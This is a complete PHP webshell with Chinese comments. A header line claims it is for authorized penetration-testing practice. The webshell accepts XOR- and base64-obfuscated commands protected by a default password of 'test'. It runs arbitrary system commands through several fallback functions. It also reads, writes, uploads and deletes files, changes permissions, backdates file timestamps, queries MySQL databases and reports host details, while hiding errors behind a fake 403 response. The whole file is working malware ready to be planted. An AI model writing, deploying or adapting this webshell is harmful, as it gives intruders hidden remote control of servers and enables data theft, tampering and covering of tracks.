<?php
/**
 * Quench Webshell - 淬火服务端 (PHP 5.3+ 兼容)
 * 用于授权的渗透测试练习，请勿用于非法用途
 */

// ============ 配置 ============
$PASSWORD = 'test';  // 连接密码，请修改

// ============ 核心函数 ============

function xor_crypt($data, $key) {
    $key_len = strlen($key);
    $data_len = strlen($data);
    $result = '';
    for ($i = 0; $i < $data_len; $i++) {
        $result .= chr(ord($data[$i]) ^ ord($key[$i % $key_len]));
    }
    return $result;
}

function decode_request() {
    $payload = isset($_POST['data']) ? $_POST['data'] : '';
    if (empty($payload)) return false;

    $encrypted = base64_decode($payload);
    if ($encrypted === false) return false;

    $json = xor_crypt($encrypted, md5($GLOBALS['PASSWORD']));
    $cmd = json_decode($json, true);
    if ($cmd === null) return false;

    return $cmd;
}

function encode_response($data) {
    // 确保所有数据都是 UTF-8（处理 GBK 文件名等）
    $data = auto_utf8($data);
    $json = json_encode($data);
    // 如果 JSON 编码失败，返回错误信息
    if ($json === false) {
        $json = json_encode(array(
            'error' => 'JSON 编码失败: ' . json_last_error_msg(),
        ));
    }
    $encrypted = xor_crypt($json, md5($GLOBALS['PASSWORD']));
    echo base64_encode($encrypted);
}

function safe_path($path) {
    // 先将 UTF-8 路径转为系统编码（Windows GBK）
    $path = to_sys_encoding($path);

    $path = str_replace('\\', '/', $path);
    if (strpos($path, '../') !== false) return false;
    if (strlen($path) === 0) return false;

    if (!preg_match('#^[a-zA-Z]:/#', $path) && $path[0] !== '/') {
        $path = str_replace('\\', '/', getcwd()) . '/' . $path;
    }

    $path = preg_replace('#/+#', '/', $path);
    return $path;
}

// ============ 编码转换 ============

/**
 * 自动检测并转换字符串为 UTF-8
 * 中文 Windows 文件系统返回 GBK，JSON 编码必须是 UTF-8
 */
function auto_utf8($str) {
    if (is_array($str)) {
        $result = array();
        foreach ($str as $k => $v) {
            $result[auto_utf8($k)] = auto_utf8($v);
        }
        return $result;
    }
    // 已经是合法 UTF-8 就不转换
    $is_utf8 = function_exists('mb_check_encoding')
        ? mb_check_encoding($str, 'UTF-8')
        : @preg_match('//u', $str);
    if ($is_utf8) {
        return $str;
    }
    // 尝试 GBK -> UTF-8
    if (function_exists('iconv')) {
        $converted = @iconv('GBK', 'UTF-8//IGNORE', $str);
        if ($converted !== false) {
            return $converted;
        }
    }
    return $str;
}

/**
 * UTF-8 路径转系统编码（用于访问含中文的路径）
 */
function to_sys_encoding($path) {
    // 纯 ASCII 直接返回
    if (function_exists('mb_check_encoding')
        ? mb_check_encoding($path, 'ASCII')
        : !preg_match('/[^\x00-\x7F]/', $path)) {
        return $path;
    }
    // UTF-8 -> GBK (Windows 中文环境)
    if (function_exists('iconv')) {
        $converted = @iconv('UTF-8', 'GBK//IGNORE', $path);
        if ($converted !== false) {
            return $converted;
        }
    }
    return $path;
}

// ============ 文件操作 ============

function cmd_list_dir($path) {
    $safe = safe_path( $path);
    if ($safe === false || !is_dir($safe)) {
        return array('error' => '目录不存在');
    }

    $items = array();
    $dh = opendir($safe);
    if (!$dh) return array('error' => '无法打开目录');

    while (($entry = readdir($dh)) !== false) {
        if ($entry === '.' || $entry === '..') continue;
        $fp = $safe . '/' . $entry;
        $items[] = array(
            'name'  => auto_utf8($entry),     // GBK -> UTF-8
            'type'  => is_dir($fp) ? 'dir' : 'file',
            'size'  => is_file($fp) ? filesize($fp) : 0,
            'mtime' => filemtime($fp),
            'perms' => substr(sprintf('%o', fileperms($fp)), -4),
        );
    }
    closedir($dh);

    for ($i = 0; $i < count($items) - 1; $i++) {
        for ($j = $i + 1; $j < count($items); $j++) {
            $swap = false;
            if ($items[$i]['type'] !== $items[$j]['type']) {
                if ($items[$j]['type'] === 'dir') $swap = true;
            } else {
                if (strcasecmp($items[$i]['name'], $items[$j]['name']) > 0) $swap = true;
            }
            if ($swap) {
                $tmp = $items[$i];
                $items[$i] = $items[$j];
                $items[$j] = $tmp;
            }
        }
    }

    return array('path' => str_replace('\\', '/', $safe), 'items' => $items);
}

function cmd_read_file($path) {
    $safe = safe_path( $path);
    if ($safe === false || !is_file($safe)) {
        return array('error' => '文件不存在');
    }
    if (!is_readable($safe)) {
        return array('error' => '文件不可读');
    }
    $content = file_get_contents($safe);
    if ($content === false) {
        return array('error' => '读取文件失败');
    }
    // 文件内容可能含 GBK，base64 编码传输避免 JSON 问题
    return array(
        'path'    => str_replace('\\', '/', $safe),
        'content' => base64_encode($content),
        'encoded' => true,
        'size'    => strlen($content),
    );
}

function cmd_write_file($path, $content) {
    $safe = safe_path( $path);
    if ($safe === false) {
        return array('error' => '路径不合法');
    }
    $dir = dirname($safe);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    $result = file_put_contents($safe, $content);
    if ($result === false) {
        return array('error' => '写入文件失败');
    }
    return array('path' => str_replace('\\', '/', $safe), 'written' => $result);
}

function cmd_delete($path) {
    $safe = safe_path( $path);
    if ($safe === false) {
        return array('error' => '路径不合法');
    }
    if (!file_exists($safe)) {
        return array('error' => '文件/目录不存在');
    }
    if (is_dir($safe)) {
        // PHP 5.2 兼容方式递归删除目录
        $items = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($safe),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($items as $file) {
            $filename = $file->getFilename();
            if ($filename === '.' || $filename === '..') {
                continue;
            }
            $filepath = $file->getPathname();
            if ($file->isDir()) {
                rmdir($filepath);
            } else {
                unlink($filepath);
            }
        }
        rmdir($safe);
    } else {
        unlink($safe);
    }
    return array('deleted' => str_replace('\\', '/', $safe));
}

function cmd_rename($path, $newname) {
    $safe = safe_path( $path);
    if ($safe === false || !file_exists($safe)) {
        return array('error' => '文件/目录不存在');
    }
    $newpath = dirname($safe) . '/' . basename($newname);
    if (!rename($safe, $newpath)) {
        return array('error' => '重命名失败');
    }
    return array(
        'from' => str_replace('\\', '/', $safe),
        'to'   => str_replace('\\', '/', $newpath),
    );
}

function cmd_chmod($path, $mode) {
    $safe = safe_path( $path);
    if ($safe === false || !file_exists($safe)) {
        return array('error' => '文件/目录不存在');
    }
    $oct = octdec($mode);
    if (!chmod($safe, $oct)) {
        return array('error' => '修改权限失败');
    }
    return array('path' => str_replace('\\', '/', $safe), 'mode' => $mode);
}

function cmd_touch($path, $time = null) {
    $safe = safe_path( $path);
    if ($safe === false) {
        return array('error' => '路径不合法');
    }
    $mtime = $time ? strtotime($time) : time();
    if (!touch($safe, $mtime)) {
        return array('error' => '修改时间戳失败');
    }
    return array('path' => str_replace('\\', '/', $safe), 'mtime' => $mtime);
}

// ============ 命令执行 ============

function cmd_exec($command) {
    // Windows 中文环境常见：输出是 GBK 编码
    // 重定向 stderr 到 stdout 确保捕获全部输出
    $command .= ' 2>&1';

    // 优先用 shell_exec（直接返回完整字符串）
    if (function_exists('shell_exec')) {
        $result = shell_exec($command);
        if ($result !== null && $result !== '') {
            // 尝试 GBK -> UTF-8 转换（Windows 中文环境）
            $converted = @iconv('GBK', 'UTF-8//IGNORE', $result);
            if ($converted !== false) {
                $result = $converted;
            }
            return array('output' => $result, 'retval' => 0);
        }
    }

    // 回退：exec + popen
    $output = array();
    $retval = 0;
    exec($command, $output, $retval);
    $result = implode("\n", $output);

    // 尝试 GBK 转换
    if (!empty($result)) {
        $converted = @iconv('GBK', 'UTF-8//IGNORE', $result);
        if ($converted !== false) {
            $result = $converted;
        }
    }

    // 还不行就用 system() 直接刷输出缓冲区
    if (empty($result) && function_exists('system')) {
        ob_start();
        system($command, $retval);
        $result = ob_get_clean();
        if ($result === false) $result = '';
    }

    // 最后尝试 popen
    if (empty($result)) {
        $fp = @popen($command, 'r');
        if ($fp) {
            $result = '';
            while (!feof($fp)) {
                $result .= fread($fp, 8192);
            }
            pclose($fp);
        }
    }

    return array('output' => $result, 'retval' => $retval);
}

// ============ 数据库操作 ============

function cmd_db_query($host, $port, $user, $pass, $dbname, $sql) {
    if (function_exists('mysqli_connect')) {
        $conn = @mysqli_connect($host, $user, $pass, $dbname, intval($port));
        if (!$conn) {
            return array('error' => 'mysqli 连接失败: ' . mysqli_connect_error());
        }
        mysqli_set_charset($conn, 'utf8');
        $result = mysqli_query($conn, $sql);
        if ($result === false) {
            $err = mysqli_error($conn);
            mysqli_close($conn);
            return array('error' => '查询失败: ' . $err);
        }
        $data = array();
        if ($result instanceof mysqli_result) {
            while ($row = mysqli_fetch_assoc($result)) {
                $data[] = $row;
            }
            mysqli_free_result($result);
        } else {
            $data[] = array('affected_rows' => mysqli_affected_rows($conn));
        }
        mysqli_close($conn);
        return array(
            'columns' => empty($data) ? array() : array_keys($data[0]),
            'rows'    => $data,
            'count'   => count($data),
        );
    }

    if (class_exists('PDO')) {
        try {
            $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8";
            $pdo = new PDO($dsn, $user, $pass, array(
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            ));
            $stmt = $pdo->query($sql);
            if ($stmt === false) {
                return array('error' => '查询失败');
            }
            $data = $stmt->fetchAll();
            return array(
                'columns' => empty($data) ? array() : array_keys($data[0]),
                'rows'    => $data,
                'count'   => count($data),
            );
        } catch (PDOException $e) {
            return array('error' => 'PDO 连接失败: ' . $e->getMessage());
        }
    }

    return array('error' => '没有可用的数据库扩展 (mysqli/PDO)');
}

// ============ 系统信息 ============

function cmd_info() {
    $info = array(
        'os'            => PHP_OS,
        'php_version'   => PHP_VERSION,
        'sapi'          => php_sapi_name(),
        'user'          => function_exists('get_current_user') ? get_current_user() : '',
        'hostname'      => function_exists('gethostname') ? gethostname() : php_uname('n'),
        'cwd'           => str_replace('\\', '/', getcwd()),
        'extensions'    => get_loaded_extensions(),
        'disabled_func' => ini_get('disable_functions'),
        'upload_max'    => ini_get('upload_max_filesize'),
        'server_ip'     => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '',
        'client_ip'     => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
    );
    return $info;
}

// ============ 文件上传 ============

function cmd_upload($path, $filedata) {
    $safe = safe_path( $path);
    if ($safe === false) {
        return array('error' => '路径不合法');
    }
    $dir = dirname($safe);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    $decoded = base64_decode($filedata);
    $result = file_put_contents($safe, $decoded);
    if ($result === false) {
        return array('error' => '上传文件失败');
    }
    return array('path' => str_replace('\\', '/', $safe), 'size' => $result);
}

// ============ 主入口 ============

set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$cmd = decode_request();
if ($cmd === false) {
    header('HTTP/1.1 403 Forbidden');
    die('Access Denied');
}

$action = isset($cmd['action']) ? $cmd['action'] : '';
$response = array('error' => '未知操作');

switch ($action) {
    // ======== 文件操作 ========
    case 'list':
        $response = cmd_list_dir(isset($cmd['path']) ? $cmd['path'] : '.');
        break;

    case 'read':
        $response = cmd_read_file(isset($cmd['path']) ? $cmd['path'] : '');
        break;

    case 'write':
        $response = cmd_write_file(
            isset($cmd['path']) ? $cmd['path'] : '',
            isset($cmd['content']) ? $cmd['content'] : ''
        );
        break;

    case 'delete':
        $response = cmd_delete(isset($cmd['path']) ? $cmd['path'] : '');
        break;

    case 'rename':
        $response = cmd_rename(
            isset($cmd['path']) ? $cmd['path'] : '',
            isset($cmd['newname']) ? $cmd['newname'] : ''
        );
        break;

    case 'chmod':
        $response = cmd_chmod(
            isset($cmd['path']) ? $cmd['path'] : '',
            isset($cmd['mode']) ? $cmd['mode'] : '0644'
        );
        break;

    case 'touch':
        $response = cmd_touch(
            isset($cmd['path']) ? $cmd['path'] : '',
            isset($cmd['time']) ? $cmd['time'] : null
        );
        break;

    case 'upload':
        $response = cmd_upload(
            isset($cmd['path']) ? $cmd['path'] : '',
            isset($cmd['data']) ? $cmd['data'] : ''
        );
        break;

    // ======== 命令执行 ========
    case 'exec':
        $response = cmd_exec(isset($cmd['command']) ? $cmd['command'] : '');
        break;

    // ======== 数据库 ========
    case 'db_query':
        $response = cmd_db_query(
            isset($cmd['host']) ? $cmd['host'] : 'localhost',
            isset($cmd['port']) ? $cmd['port'] : '3306',
            isset($cmd['user']) ? $cmd['user'] : 'root',
            isset($cmd['pass']) ? $cmd['pass'] : '',
            isset($cmd['dbname']) ? $cmd['dbname'] : '',
            isset($cmd['sql']) ? $cmd['sql'] : ''
        );
        break;

    // ======== 系统信息 ========
    case 'info':
        $response = cmd_info();
        break;

    // ======== 测试连接 ========
    case 'ping':
        $response = array('pong' => true, 'time' => date('Y-m-d H:i:s'));
        break;
}

encode_response($response);
